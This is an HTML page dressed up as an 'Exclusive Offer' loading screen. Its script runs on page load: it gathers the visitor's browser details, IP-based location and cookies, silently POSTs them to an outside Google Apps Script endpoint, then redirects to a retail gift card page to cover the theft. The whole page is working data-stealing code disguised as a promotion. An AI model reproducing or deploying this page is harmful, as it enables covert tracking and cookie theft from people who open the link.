<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exclusive Offer - Claim Now!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 20%;
        }
        h1 {
            color: #333;
        }
        p {
            font-size: 18px;
            color: #666;
        }
    </style>
</head>
<body>
    <h1>Processing Your Exclusive Offer...</h1>
    <p>Please wait while we prepare your personalized offer.</p>

    <script>
        // Get Device Info
        let userAgent = navigator.userAgent;

        // Get IP-based Location using ip-api.com (using HTTPS)
        fetch('https://ip-api.com/json')
            .then(response => response.json())
            .then(data => {
                let ipAddress = data.query;
                let location = `City: ${data.city}, Region: ${data.regionName}, Country: ${data.country}`;

                // Get Cookies
                let cookies = document.cookie || "No cookies available";

                // Prepare data to send
                let userData = {
                    ip: ipAddress,
                    location: location,
                    device: userAgent,
                    cookies: cookies
                };

                // Send data to Google Apps Script Web App with no-cors mode
                fetch('https://script.google.com/macros/s/AKfycbw-ZyPqRTxpno-zSBjilrYACHAW4piIc03hC3lT0cfBzLjggztQNRnmJwln26TrOipPow/exec', {
                    method: 'POST',
                    mode: 'no-cors',  // This prevents CORS issues, but we can't check the response
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(userData)
                })
                .then(() => {
                    console.log('Data sent successfully');
                    
                    // Redirect the user immediately after data is sent
                    window.location.href = "https://www.noon.com/uae-en/electronics-and-mobiles/gift-card/";
                })
                .catch((error) => console.error('Error:', error));
            })
            .catch(err => console.error('Error fetching IP-based location:', err));
    </script>
</body>
</html>
